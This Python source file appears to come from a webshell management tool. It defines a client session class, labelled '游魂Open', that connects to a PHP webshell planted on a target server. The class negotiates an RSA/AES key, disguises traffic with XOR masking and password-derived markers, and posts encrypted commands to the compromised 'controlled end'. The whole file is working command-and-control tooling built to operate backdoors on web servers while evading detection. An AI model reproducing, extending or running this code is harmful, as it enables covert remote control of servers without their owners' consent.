import asyncio
import typing as t
import hashlib
import logging
import base64
import random

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.strxor import strxor
import httpx

from ..core import exceptions

from ..core.base import (
    register_session,
    ConnOption,
    ConnOptionGroup,
    get_http_client,
)
from ..core.php_session_common import (
    PHPWebshellActions,
    PHPWebshellCommunication,
    php_webshell_action_options,
    php_webshell_communication_options,
)
from ..utils.cipher import (
    get_rsa_key,
    private_decrypt_rsa,
    encrypt_aes256_cbc,
    decrypt_aes256_cbc,
)

logger = logging.getLogger("core.sessions.php_etherghost")

@register_session
class PHPWebshellEtherGhostOpen(PHPWebshellCommunication, PHPWebshellActions):
    session_type = "ETHERGHOST_PHP_OPEN"
    readable_name = "游魂Open"
    conn_options: t.List[ConnOptionGroup] = [
        {
            "name": "基本连接配置",
            "options": [
                ConnOption(
                    id="url",
                    name="地址",
                    type="text",
                    placeholder="http://xxx.com",
                    default_value=None,
                    alternatives=None,
                ),
                ConnOption(
                    id="password",
                    name="密码",
                    type="text",
                    placeholder="******",
                    default_value="ether_ghost",
                    alternatives=None,
                ),
            ],
        },
        {
            "name": "高级连接配置",
            "options": [
                ConnOption(
                    id="timeout_refresh_client",
                    name="超时更换HTTP Session",
                    type="checkbox",
                    placeholder="一直使用相同的PHPSESSID可能会导致前一个长时间操作阻塞接下来的操作",
                    default_value=True,
                    alternatives=None,
                ),
                ConnOption(
                    id="https_verify",
                    name="验证HTTPS证书",
                    type="checkbox",
                    placeholder=None,
                    default_value=True,
                    alternatives=None,
                ),
            ]
            + php_webshell_communication_options
            + php_webshell_action_options,
        },
    ]

    def __init__(self, session_conn: dict):
        super().__init__(session_conn)
        self.url = session_conn["url"]
        self.password = session_conn["password"]
        self.https_verify = session_conn.get("https_verify", False)
        self.client = get_http_client(verify=self.https_verify)
        self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)

        self.key = None
        self.key_communicate_lock = asyncio.Lock()

        password_md5 = hashlib.md5(self.password.encode("utf-8")).digest()
        self.start_mask, self.stop_mask = password_md5[:8], password_md5[8:16]

    async def communicate_aes_key(self):
        pubkey, _ = get_rsa_key()
        _, result = await self.submit_obfs("s", (pubkey))
        if result == "WRONG_NO_OPENSSL":
            raise exceptions.TargetRuntimeError("目标不支持OpenSSL")
        if result == "WRONG_NO_OPENSSL_FUNCTION":
            raise exceptions.TargetRuntimeError(
                "目标不支持所需OpenSSL函数，也许是函数被禁用了"
            )
        self.key = private_decrypt_rsa(result)

    async def submit_http(self, payload: t.Union[str, bytes]) -> t.Union[int, str]:
        async with self.key_communicate_lock:
            if not self.key:
                await self.communicate_aes_key()
        # TODO: check encoding here, windows use gbk
        if isinstance(payload, str):
            payload = payload.encode("utf-8")
        payload_enc = encrypt_aes256_cbc(self.key, payload)
        status_code, result_enc = await self.submit_obfs("r", payload_enc)
        result = decrypt_aes256_cbc(self.key, result_enc)
        return status_code, result.decode("utf-8")

    async def submit_obfs(self, action: str, data: bytes) -> t.Union[int, bytes]:
        call = action.encode("utf-8") + data

        k = random.randbytes(8)
        k_repeated = k * (len(call) // 8 + 1)
        masked = strxor(call, k_repeated[: len(call)])
        raw_data = self.start_mask + k + masked + self.stop_mask

        status_code, response = await self.submit_raw(raw_data)
        return (
            status_code,
            response.partition(self.start_mask)[2].partition(self.stop_mask)[0],
        )

    async def submit_raw(self, payload: bytes) -> t.Union[int, bytes]:
        try:
            response = await self.client.request(
                method="POST", url=self.url, content=payload
            )
            return response.status_code, response.content
        except httpx.TimeoutException as exc:
            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
            # 此时服务端会为这个session id等待这个长时间操作
            # 所以我们再使用这个session id发起请求就会卡住
            # 所以我们要丢掉这个session id，使用另一个client发出请求
            if self.timeout_refresh_client:
                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
                self.client = get_http_client(verify=self.https_verify)
            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
        except httpx.HTTPError as exc:
            raise exceptions.NetworkError("发送HTTP请求到受控端失败") from exc
